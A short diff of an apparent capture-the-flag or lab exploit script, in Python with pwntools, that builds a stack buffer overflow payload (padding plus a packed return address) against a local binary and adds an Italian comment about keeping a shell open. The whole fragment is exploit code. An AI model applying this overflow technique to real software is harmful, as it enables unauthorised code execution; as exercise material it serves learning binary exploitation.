@@ -31,7 +31,7 @@ STACK:
     p=process('./java')
     target = p64(0x4007a2)
     
-    payload = b'java' + b'A'*(28) + target
+    payload = b'java' + b'A'*(28) + target  #nota: importante perchè così il programma non termina e posso usare la bash in santa pace
     #payload = payload.encode("ascii")
     msgin = payload + target
     p = process("./java")
